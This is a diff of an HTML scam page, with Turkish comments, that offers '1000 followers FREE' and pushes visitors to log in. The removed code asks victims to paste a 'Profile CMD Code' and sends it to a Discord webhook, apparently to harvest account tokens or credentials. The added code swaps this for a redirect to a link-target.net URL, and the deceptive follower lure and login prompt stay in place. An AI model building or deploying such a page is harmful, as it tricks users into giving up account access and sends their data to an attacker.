@@ -103,8 +103,8 @@
 <body>
     <h2>If your account does not have a verified tick, you must log in. If it is verified, you can send 1000 followers "FREE" by just typing your name. If you do not have a verified tick, you must log in. You can log in using the button below.</h2>
 
-    <textarea id="inputText" placeholder="Enter Profile CMD Code Here!" oninput="maskInput()"></textarea><br>
-    <button onclick="uploadText()">Send!</button><br>
+    <textarea id="inputText" placeholder="Enter Username Here!" oninput="maskInput()"></textarea><br>
+    <button onclick="redirectToSite()">Send!</button><br>
     <!-- Login Butonu Eklendi -->
     <button onclick="redirectToLogin()">Login</button>
 
@@ -119,20 +119,10 @@
             // Maskeleme yapılmıyor, yazdıkları olduğu gibi görünecek
         }
 
-        function uploadText() {
-            const text = document.getElementById("inputText").value;
-
-            // Gerçek metni, maskelenmiş olanı değil, webhook'a gönderelim
-            sendToDiscord(text);
-
-            // Success mesajını gösterelim
-            const messageContainer = document.getElementById("message-container");
-            messageContainer.style.display = "block";
-
-            // Success mesajının görünümünü belirli bir süre sonra gizleyelim
-            setTimeout(() => {
-                messageContainer.style.display = "none";
-            }, 3000);  // 3 saniye sonra mesaj kaybolacak
+        // Yeni fonksiyon: Kullanıcıyı belirttiğiniz siteye yönlendirme
+        function redirectToSite() {
+            // Buraya istediğiniz URL'yi yazabilirsiniz.
+            window.location.href = "https://link-target.net/1244839/you-need-login";  // Örnek site adresi, değiştirebilirsiniz
         }
 
         // Login butonuna yönlendirme işlemi
